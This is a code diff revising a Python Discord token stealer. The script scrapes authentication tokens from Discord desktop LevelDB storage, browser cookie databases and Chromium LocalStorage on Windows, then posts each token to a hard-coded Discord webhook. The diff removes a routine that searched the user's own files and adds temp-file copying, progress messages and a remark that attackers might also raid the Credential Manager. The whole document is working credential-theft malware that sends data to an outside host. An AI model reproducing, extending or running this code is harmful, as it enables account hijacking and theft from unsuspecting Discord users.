@@ -1,12 +1,14 @@
-import os, re, sqlite3, shutil, glob, requests
+import os, re, sqlite3, shutil, requests
 from pathlib import Path
 
-WEBHOOK = "https://discord.com/api/webhooks/1501597067926044736/VZZxbllJi-SrXWpiYFBgGRmDYM1xH-Y-bJC8w03rduLAnk4-f3who1qPSjaWRI_FVHWV"   # 🔴 REPLACE
+# 🔴 REPLACE WITH YOUR REAL DISCORD WEBHOOK URL
+WEBHOOK = "https://discord.com/api/webhooks/1501597067926044736/VZZxbllJi-SrXWpiYFBgGRmDYM1xH-Y-bJC8w03rduLAnk4-f3who1qPSjaWRI_FVHWV"
 
 # ---------- Helper: extract tokens from any text ----------
 def extract_tokens(text):
+    # Standard Discord token regex (supports all variants)
     patterns = [
-        r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',      # standard
+        r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',      # normal
         r'mfa\.[\w-]{84}',                      # MFA token
         r'[\w-]{24,28}\.[\w-]{6,7}\.[\w-]{27,38}' # extended
     ]
@@ -15,16 +17,21 @@ def extract_tokens(text):
         tokens.extend(re.findall(p, text))
     return list(set(tokens))
 
-# ---------- Method 1: Discord Desktop LevelDB ----------
-def scan_leveldb(path):
+# ---------- Method 1: Discord Desktop LevelDB (copy then read) ----------
+def scan_leveldb_folder(path):
     tokens = []
     if not os.path.isdir(path):
         return tokens
-    for f in os.listdir(path):
-        if f.endswith(('.log', '.ldb')):
+    # Create a temporary copy of the whole folder? No, just copy each file.
+    for filename in os.listdir(path):
+        if filename.endswith(('.log', '.ldb')):
+            src = os.path.join(path, filename)
+            dst = os.path.join(os.environ['TEMP'], filename)
             try:
-                with open(os.path.join(path, f), 'r', errors='ignore') as fp:
-                    tokens.extend(extract_tokens(fp.read()))
+                shutil.copy2(src, dst)
+                with open(dst, 'r', errors='ignore') as f:
+                    tokens.extend(extract_tokens(f.read()))
+                os.remove(dst)
             except:
                 pass
     return tokens
@@ -33,17 +40,15 @@ def discord_desktop_tokens():
     tokens = []
     appdata = os.getenv('APPDATA')
     localapp = os.getenv('LOCALAPPDATA')
-    possible_paths = []
     for base in [appdata, localapp]:
         if not base:
             continue
         for variant in ['discord', 'discordcanary', 'discordptb']:
-            possible_paths.append(os.path.join(base, variant, 'Local Storage', 'leveldb'))
-    for p in possible_paths:
-        tokens.extend(scan_leveldb(p))
+            leveldb_path = os.path.join(base, variant, 'Local Storage', 'leveldb')
+            tokens.extend(scan_leveldb_folder(leveldb_path))
     return tokens
 
-# ---------- Method 2: Browser Cookies (Discord web) ----------
+# ---------- Method 2: Browser cookies (Discord web) ----------
 def browser_cookie_tokens():
     tokens = []
     browsers = {
@@ -61,9 +66,10 @@ def browser_cookie_tokens():
             shutil.copy2(path, temp)
             conn = sqlite3.connect(temp)
             cur = conn.cursor()
-            cur.execute("SELECT value FROM cookies WHERE name = 'token' OR host_key LIKE '%discord%'")
+            # Look for 'token' cookie or any cookie containing discord token pattern
+            cur.execute("SELECT name, value FROM cookies WHERE name = 'token' OR value LIKE '%mfa%' OR value LIKE '%.%'")
             for row in cur.fetchall():
-                val = row[0]
+                val = row[1]
                 if val and len(val) > 30:
                     tokens.extend(extract_tokens(val))
             conn.close()
@@ -73,53 +79,52 @@ def browser_cookie_tokens():
             except: pass
     return tokens
 
-# ---------- Method 3: Browser LocalStorage (Discord web) ----------
+# ---------- Method 3: Browser LocalStorage (Chromium) ----------
 def browser_localstorage_tokens():
     tokens = []
-    localStorage_paths = [
+    storage_paths = [
         os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Storage\leveldb'),
         os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Local Storage\leveldb'),
         os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb')
     ]
-    for path in localStorage_paths:
+    for path in storage_paths:
         if not os.path.isdir(path):
             continue
         for f in os.listdir(path):
             if f.endswith(('.log', '.ldb')):
+                src = os.path.join(path, f)
+                dst = os.path.join(os.environ['TEMP'], f)
                 try:
-                    with open(os.path.join(path, f), 'r', errors='ignore') as fp:
+                    shutil.copy2(src, dst)
+                    with open(dst, 'r', errors='ignore') as fp:
                         tokens.extend(extract_tokens(fp.read()))
+                    os.remove(dst)
                 except:
                     pass
     return tokens
 
-# ---------- Method 4: Common token storage files (backup) ----------
-def common_files_tokens():
-    tokens = []
-    # Search known token dumps (victim might have saved)
-    search_dirs = [os.environ['USERPROFILE'], os.environ['TEMP']]
-    for d in search_dirs:
-        for ext in ['*.txt', '*.log', '*.json']:
-            for f in glob.glob(os.path.join(d, ext)):
-                try:
-                    with open(f, 'r', errors='ignore') as fp:
-                        tokens.extend(extract_tokens(fp.read()))
-                except:
-                    pass
-    return tokens
+# ---------- Method 4: Windows Credential Manager (optional, requires admin) ----------
+# Not included to keep script simple, but real hackers might add it.
 
 # ---------- Main ----------
 def main():
     all_tokens = []
+    print("[*] Scanning Discord Desktop LevelDB...")
     all_tokens.extend(discord_desktop_tokens())
+    print("[*] Scanning browser cookies...")
     all_tokens.extend(browser_cookie_tokens())
+    print("[*] Scanning browser LocalStorage...")
     all_tokens.extend(browser_localstorage_tokens())
-    all_tokens.extend(common_files_tokens())
 
     # Deduplicate
     unique = list(set(all_tokens))
     if unique:
-        requests.post(WEBHOOK, json={"discord_tokens": unique})
+        print(f"[+] Found {len(unique)} Discord tokens. Sending to webhook...")
+        # Send in chunks if too many
+        for token in unique:
+            requests.post(WEBHOOK, json={"token": token})
+    else:
+        print("[-] No Discord tokens found.")
 
 if __name__ == '__main__':
     main()
